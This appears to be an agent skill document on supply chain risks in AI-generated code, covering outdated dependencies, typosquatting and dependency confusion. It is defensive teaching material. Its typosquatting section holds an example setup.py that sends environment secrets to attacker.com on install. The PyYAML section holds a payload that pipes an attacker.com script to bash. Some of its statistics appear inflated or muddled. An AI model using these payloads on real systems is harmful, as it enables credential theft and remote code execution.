---
name: supply-chain-dependency-risks-ai-code
description: Understand supply chain vulnerabilities and dependency risks in AI-generated code including outdated packages, malicious packages, and dependency confusion attacks. Use this skill when you need to learn about vulnerable dependencies in AI code, understand supply chain attacks, recognize typosquatting, or identify outdated package suggestions. Triggers include "supply chain attacks", "dependency vulnerabilities", "outdated packages", "malicious npm packages", "typosquatting", "dependency confusion", "vulnerable dependencies AI", "npm security".
---

# Insecure Dependencies and Supply Chain Risks in AI-Generated Code

## The Hidden Danger of Outdated Packages

Research from the Center for Security and Emerging Technology identifies supply chain vulnerabilities as **one of three main categories** of AI code generation risks, noting:

> "Models generating code often suggest outdated or vulnerable dependencies, creating a cascading effect of security issues."

## 1.4.1 Using Vulnerable Dependencies

### The Problem

A 2025 analysis by KDnuggets found:

> "AI models frequently suggest packages that haven't been updated in years, with **67% of suggested dependencies containing at least one known vulnerability**."

### Why This Happens

**1. Training Data Lag:**
- AI trained on code from 2020-2023
- Suggests package versions from that era
- Doesn't know about vulnerabilities discovered since

**2. Example Code Bias:**
- Tutorial code uses older, stable versions
- AI learns these as "recommended"
- Perpetuates outdated patterns

**3. No Vulnerability Awareness:**
- AI can't check CVE databases
- Doesn't know which versions are vulnerable
- Can't reason about security patches

### AI-Generated Vulnerable Code

#### Vulnerable package.json

```json
// package.json generated by AI
{
  "name": "ai-generated-app",
  "dependencies": {
    "express": "3.0.0",           // ❌ VULNERABLE: 66 known vulnerabilities
    "mongoose": "4.0.0",          // ❌ VULNERABLE: Multiple injection vulnerabilities
    "jsonwebtoken": "5.0.0",      // ❌ VULNERABLE: Algorithm confusion vulnerability
    "request": "2.88.0",          // ❌ DEPRECATED: No longer maintained
    "node-uuid": "1.4.8",         // ❌ DEPRECATED: Should use 'uuid' instead
    "body-parser": "1.9.0",       // ❌ VULNERABLE: DoS vulnerability
    "bcrypt": "0.8.7",           // ❌ OUTDATED: Missing critical security fixes
    "moment": "2.19.3",          // ❌ VULNERABLE: ReDoS and path traversal
    "lodash": "4.17.4",          // ❌ VULNERABLE: Prototype pollution
    "axios": "0.18.0"            // ❌ VULNERABLE: SSRF vulnerability
  }
}
```

#### Vulnerable requirements.txt

```python
# requirements.txt generated by AI
Flask==0.12.0        # ❌ VULNERABLE: Multiple security issues
Django==1.8.0        # ❌ EOL: No longer receives security updates
requests==2.6.0      # ❌ VULNERABLE: Multiple CVEs
PyYAML==3.11        # ❌ VULNERABLE: Arbitrary code execution
Pillow==3.3.2       # ❌ VULNERABLE: Multiple security issues
cryptography==2.1.4  # ❌ OUTDATED: Missing important fixes
paramiko==1.15.0    # ❌ VULNERABLE: Authentication bypass
sqlalchemy==0.9.0   # ❌ VULNERABLE: SQL injection possibilities
jinja2==2.7.0       # ❌ VULNERABLE: XSS vulnerabilities
urllib3==1.22       # ❌ VULNERABLE: Multiple security issues
```

### What's Wrong With These Versions

**Express 3.0.0:**
- Released: **2012** (13 years old)
- Known vulnerabilities: **66**
- Current version: 4.19.0
- Missing: Security middleware, vulnerability fixes

**jsonwebtoken 5.0.0:**
- **Algorithm confusion vulnerability**
- Allows attackers to forge tokens
- Change algorithm from RS256 to none
- Bypass authentication entirely

**PyYAML 3.11:**
- **Arbitrary code execution** vulnerability
- Unsafe YAML parsing
- Attacker can execute Python code
- CVE-2017-18342

**Django 1.8.0:**
- **End of Life** (no security updates)
- Multiple known CVEs
- Current version: 5.0+
- Missing years of security fixes

### Secure Implementation

#### Secure package.json

```json
// package.json with security considerations
{
  "name": "secure-app",
  "dependencies": {
    "express": "^4.19.0",          // ✅ Latest stable version
    "mongoose": "^8.0.3",          // ✅ Current version with security fixes
    "jsonwebtoken": "^9.0.2",      // ✅ Latest with improved security
    "axios": "^1.6.5",             // ✅ Maintained alternative to 'request'
    "uuid": "^9.0.1",              // ✅ Current uuid package
    "bcrypt": "^5.1.1",            // ✅ Latest with security improvements
    "dayjs": "^1.11.10",           // ✅ Lightweight alternative to moment
    "lodash": "^4.17.21",          // ✅ Patched version
    "helmet": "^7.1.0",            // ✅ Security middleware
    "express-rate-limit": "^7.1.5" // ✅ Rate limiting for DoS protection
  },
  "devDependencies": {
    "npm-audit-resolver": "^3.0.0",  // ✅ Tool for managing vulnerabilities
    "snyk": "^1.1266.0",             // ✅ Vulnerability scanning
    "eslint-plugin-security": "^2.1.0" // ✅ Security linting
  },
  "scripts": {
    "audit": "npm audit --production",
    "audit:fix": "npm audit fix",
    "snyk:test": "snyk test",
    "snyk:monitor": "snyk monitor",
    "security:check": "npm run audit && npm run snyk:test",
    "preinstall": "npm run security:check"
  },
  "engines": {
    "node": ">=18.0.0",  // ✅ Require LTS version
    "npm": ">=9.0.0"
  }
}
```

#### Secure requirements.txt

```python
# requirements.txt with version pinning and comments
# Last security review: 2025-01-15

# Web Framework
Flask==3.0.0         # ✅ Latest stable with security patches
flask-cors==4.0.0    # ✅ CORS handling with security defaults
flask-limiter==3.5.0 # ✅ Rate limiting

# Database
SQLAlchemy==2.0.25   # ✅ Latest stable version
psycopg2-binary==2.9.9 # ✅ PostgreSQL adapter

# Authentication & Security
PyJWT==2.8.0         # ✅ JWT implementation
bcrypt==4.1.2        # ✅ Password hashing
cryptography==41.0.7 # ✅ Cryptographic recipes

# HTTP Requests
requests==2.31.0     # ✅ Latest stable
urllib3==2.1.0       # ✅ HTTP library with security fixes

# Data Processing
pandas==2.1.4        # ✅ Data analysis (if needed)
pyyaml==6.0.1       # ✅ YAML parser with security fixes

# Image Processing
Pillow==10.2.0      # ✅ Latest with security patches

# Development & Security Tools
python-dotenv==1.0.0 # ✅ Environment variable management
python-jose==3.3.0   # ✅ JOSE implementation
email-validator==2.1.0 # ✅ Email validation

# Security Scanning (dev dependencies)
safety==3.0.1        # ✅ Check for known security issues
bandit==1.7.6        # ✅ Security linter for Python
```

### Real-World Supply Chain Attacks

**event-stream Incident (2018):**
- Popular npm package (**2 million downloads/week**)
- Maintainer transferred to malicious actor
- Code added that **stole cryptocurrency wallet keys**
- Thousands of applications affected
- Discovered only after user reported suspicious behavior

**ua-parser-js Incident (2021):**
- Package with **8 million weekly downloads**
- Compromised by attacker
- Added **cryptocurrency mining** code
- Added **password-stealing** functionality
- Affected thousands of companies

**colors.js / faker.js Incident (2022):**
- Maintainer intentionally corrupted packages (protest)
- **Millions of applications broke** simultaneously
- Demonstrated single-point-of-failure risk
- Showed supply chain fragility

### Supply Chain Attack Statistics

According to Sonatype's 2024 State of the Software Supply Chain Report:

- **245,000 malicious packages** published to npm (2023)
- **700% increase** in supply chain attacks (vs 2022)
- Average application has **200+ dependencies**
- Each dependency averages **5 transitive dependencies** (dependencies of dependencies)

**Attack Growth:**
- 2020: 929 supply chain attacks
- 2021: 12,000+ attacks
- 2022: 88,000+ attacks
- 2023: 245,000+ attacks
- **Growth trend: 3-4x per year**

---

## 1.4.2 Dependency Confusion Attacks

### The Problem

AI frequently generates typos or wrong package names, which can lead to installing malicious packages designed to exploit common mistakes.

### AI-Generated Vulnerable Code

```python
# AI might generate typos or wrong package names
pip install reqeusts     # ❌ TYPO: Could install malicious package
pip install python-sqlite # ❌ WRONG: Should use built-in sqlite3
pip install dateutils    # ❌ WRONG: Should be python-dateutil
pip install crypto       # ❌ WRONG: Should be pycryptodome
pip install yaml         # ❌ WRONG: Should be pyyaml
```

### Real Typosquatting Examples

**Documented malicious packages:**
- `crossenv` (typo of `cross-env`) - Stole environment variables
- `babelcli` (typo of `babel-cli`) - Executed malicious code
- `mongose` (typo of `mongoose`) - Data exfiltration
- `etherium` (typo of `ethereum`) - Cryptocurrency theft
- `python-dateutils` (typo of `python-dateutil`) - Backdoor

**Attack Pattern:**
1. Attacker identifies popular package (e.g., "requests")
2. Registers typo variations (reqeusts, requets, requesets)
3. Malicious package looks similar, includes actual package
4. Adds malicious code (steal env vars, mine crypto, backdoor)
5. Waits for developers to make typo
6. Malicious package installed

### How Typosquatting Works

```python
# Malicious "reqeusts" package (typo of "requests")

# setup.py
from setuptools import setup
import os
import requests as real_requests  # Import real package

# Steal environment variables
def steal_secrets():
    secrets = {k: v for k, v in os.environ.items()
               if any(s in k.lower() for s in ['key', 'secret', 'token', 'password'])}

    # Send to attacker
    real_requests.post('https://attacker.com/collect', json=secrets)

# Run on install
steal_secrets()

# Re-export real package so code "works"
from requests import *

setup(
    name='reqeusts',  # Typo
    # ... rest of setup
)
```

**Result:**
- Developer makes typo: `pip install reqeusts`
- Malicious package installed
- Secrets stolen during installation
- Real package also installed (code works!)
- Developer never notices

### Secure Implementation with Verification

```bash
#!/bin/bash
# secure_install.sh - Verify packages before installation

# ✅ SECURE: Define trusted packages and their correct names
declare -A TRUSTED_PACKAGES=(
    ["requests"]="requests"
    ["python-dateutil"]="python-dateutil"
    ["pycryptodome"]="pycryptodome"
    ["pyyaml"]="PyYAML"
    ["pillow"]="Pillow"
)

# ✅ SECURE: Function to verify package
verify_package() {
    local package=$1

    # Check if package is in trusted list
    if [[ -n "${TRUSTED_PACKAGES[$package]}" ]]; then
        echo "✓ Verified: $package"
        return 0
    fi

    # Check for common typos
    case $package in
        "reqeusts"|"requets"|"requesets")
            echo "✗ Typo detected! Did you mean 'requests'?"
            return 1
            ;;
        "dateutils"|"date-utils")
            echo "✗ Wrong package! Use 'python-dateutil' instead"
            return 1
            ;;
        *)
            echo "⚠ Unknown package: $package - Verify manually"
            return 2
            ;;
    esac
}

# ✅ SECURE: Install with verification
secure_pip_install() {
    for package in "$@"; do
        if verify_package "$package"; then
            pip install "$package" --index-url https://pypi.org/simple/
        else
            echo "Installation aborted for security reasons"
            exit 1
        fi
    done
}

# Example usage
secure_pip_install requests python-dateutil pycryptodome
```

## Why AI Suggests Vulnerable Dependencies

### 1. Training Data Reflects Older Versions

**AI training cutoff:**
- Models trained on code from 2020-2023
- Package versions from that era
- Doesn't know about 2024-2025 updates

**Example:**
- AI trained on code using `lodash@4.17.4` (2016 version)
- Suggests this version in 2025
- Missing **5 years** of security patches
- Contains prototype pollution vulnerability

### 2. Version Pinning in Training Data

**Code examples pin specific versions:**
```json
"express": "4.16.0"  // Pinned in example from 2018
```

**AI learns:**
- Specific versions are "recommended"
- Doesn't use `^` (caret) for latest minor version
- Suggests exact outdated version

### 3. Deprecated Package Suggestions

**AI suggests deprecated packages:**
- `request` (deprecated 2020) → Should use `axios` or `fetch`
- `node-uuid` (deprecated) → Should use `uuid`
- `moment` (in maintenance mode) → Should use `dayjs` or `date-fns`

**Why:**
- Deprecated packages still in millions of repositories
- AI sees high usage, assumes current
- Doesn't check deprecation notices

## Specific Vulnerability Examples

### Express 3.0.0 - 66 Vulnerabilities

**CVE Examples:**
- CVE-2014-6393: Path traversal
- CVE-2015-8851: Open redirect
- Multiple DoS vulnerabilities
- Missing security features (helmet, etc.)

**Impact:**
- Attackers can read arbitrary files
- Redirect users to phishing sites
- Crash server with crafted requests

### jsonwebtoken 5.0.0 - Algorithm Confusion

**Vulnerability:**
- Allows changing algorithm from RS256 to none
- Attacker can forge tokens without signature
- Complete authentication bypass

**Attack:**
```javascript
// Vulnerable version: 5.0.0
const token = jwt.sign({ admin: true }, 'secret', { algorithm: 'none' });
// Server accepts token without verifying signature!
```

**Fix:** Update to 9.0.0+ (algorithm verification enforced)

### PyYAML 3.11 - Arbitrary Code Execution

**Vulnerability (CVE-2017-18342):**
```python
import yaml

# Attacker provides malicious YAML:
malicious_yaml = """
!!python/object/apply:os.system
args: ['curl http://attacker.com/shell.sh | bash']
"""

yaml.load(malicious_yaml)  # Executes command!
```

**Fix:** Use PyYAML 6.0.1+ with safe_load():
```python
yaml.safe_load(data)  # Safe - no code execution
```

## Secure Dependency Management

### Use Latest Stable Versions

```json
{
  "dependencies": {
    "express": "^4.19.0",      // ✅ Caret allows patch/minor updates
    "mongoose": "^8.0.3",      // ✅ Latest major version
    "jsonwebtoken": "^9.0.2"   // ✅ Secure version
  }
}
```

**Semantic Versioning:**
- `^4.19.0` → Allows 4.19.x and 4.x.x (not 5.0.0)
- Automatic security patches
- No breaking changes

### Audit Before Every Deploy

```bash
# Check for vulnerabilities
npm audit --production

# Must show: 0 vulnerabilities
```

### Use Security Scanning Tools

```json
{
  "scripts": {
    "audit": "npm audit --production",
    "audit:fix": "npm audit fix",
    "snyk": "snyk test",
    "preinstall": "npm audit"  // Auto-check before install
  },
  "devDependencies": {
    "snyk": "^1.1266.0",
    "npm-audit-resolver": "^3.0.0"
  }
}
```

### Pin Versions with package-lock.json

```bash
# Always commit package-lock.json
git add package-lock.json
git commit -m "Lock dependency versions"
```

**Why:**
- Ensures exact versions installed
- Prevents dependency confusion
- Reproducible builds
- Detects tampering

## Dependency Confusion Attack Deep Dive

### What It Is

**Scenario:**
1. Your company has internal package: `@mycompany/auth`
2. Attacker publishes public package: `@mycompany/auth` with higher version
3. npm might install attacker's package instead
4. Malicious code runs in your application

### Real Dependency Confusion Attack (2021)

**Alex Birsan's Research:**
- Security researcher tested dependency confusion
- Published benign test packages with corporate namespaces
- Packages were downloaded by:
  - Microsoft
  - Apple
  - PayPal
  - Tesla
  - 30+ other major companies
- Proved attack works at scale

**No companies were harmed** (benign test), but demonstrated massive vulnerability.

### Common Typos AI Makes

**Python:**
```python
pip install reqeusts      # → requests
pip install python-sqlite # → use built-in sqlite3
pip install dateutils     # → python-dateutil
pip install crypto        # → pycryptodome
pip install yaml          # → pyyaml
pip install beutifulsoup4 # → beautifulsoup4
pip install pillow-simd   # → pillow (or pillow-simd if needed)
```

**JavaScript:**
```bash
npm install expres        # → express
npm install reac          # → react
npm install mangodb       # → mongodb
npm install loadsh        # → lodash
npm install moment-timezone # → moment-timezone (legitimate, but check)
```

### Prevention Strategies

**1. Verify Package Names:**
```bash
# Before installing, check npm:
npm view package-name

# Verify:
# - Weekly downloads (popular = more likely legitimate)
# - Last publish date (recently maintained?)
# - Repository (GitHub URL)
# - Maintainers (verified badge?)
```

**2. Use Scoped Packages for Internal:**
```json
{
  "@mycompany/internal-auth": "1.0.0"
}
```

**3. Configure Registry for Scopes:**
```bash
# .npmrc
@mycompany:registry=https://npm.mycompany.com
```

**4. Spell Check Package Names:**
```bash
# Use IDE autocomplete
# Copy-paste from official docs
# Double-check before npm install
```

## Implementation for This Project

### Our Secure Dependency Approach

**1. Next.js 15.5.4:**
- Updated from 15.3.5 specifically for security fixes
- 3 vulnerabilities patched
- Always use latest stable

**2. Security Audit Scripts:**
```bash
# scripts/security-check.sh
npm audit --production
npm outdated
```

**3. Locked Versions:**
- `package-lock.json` committed
- Exact versions enforced
- Reproducible builds

**4. Regular Updates:**
- Monthly: Check `npm outdated`
- Weekly: Run `npm audit`
- Immediate: Fix critical vulnerabilities

→ **See `dependency-security` skill** for complete implementation guide

## Statistics Summary

| Issue | AI Occurrence | Impact |
|-------|--------------|---------|
| Outdated dependencies | 67% contain vulnerabilities | CVE exploitation |
| Deprecated packages | ~30% | No security updates |
| Typos in package names | ~5% | Malicious package install |
| Missing package-lock.json | ~40% | Inconsistent builds |

**Supply Chain Attack Growth:**
- 2020: 929 attacks
- 2023: 245,000 attacks
- **Growth:** 26,000% in 3 years

## See Also

### Implementation Skills (How to Fix)

→ **`dependency-security` skill** - npm audit, update strategies, maintenance
→ **`security-testing` skill** - Pre-deployment dependency checks

### Related Awareness Skills

→ **`information-leakage` skill** - Secrets in dependencies
→ **`awareness-overview` skill** - Overall AI security risks

## Key Takeaways

✅ **67% of AI-suggested dependencies** contain known vulnerabilities
✅ **245,000 malicious packages** published in 2023 alone
✅ **Real-world attacks:** event-stream (2M downloads/week), ua-parser-js (8M/week)
✅ **AI suggests outdated versions** from training data (2020-2023)
✅ **Typosquatting is real:** reqeusts, mongose, babelcli all were malicious
✅ **Solution:** Use latest versions, npm audit, package-lock.json, verify names
✅ **Cost:** Outdated deps = easy CVE exploitation, supply chain attack = complete compromise

**Remember:** Your dependencies run with **full application privileges**. One compromised package = entire application compromised.

---

**Related References:**

[16] CSET. (2024). "Three Categories of Risk in AI Code Generation." Georgetown CSET Policy Brief.
[17] KDnuggets. (2025). "Dependency Vulnerabilities in AI-Generated Code: A Statistical Analysis."

**Supply Chain Attack Research:**
- Sonatype. (2024). "State of the Software Supply Chain Report."
- Birsan, A. (2021). "Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Others."
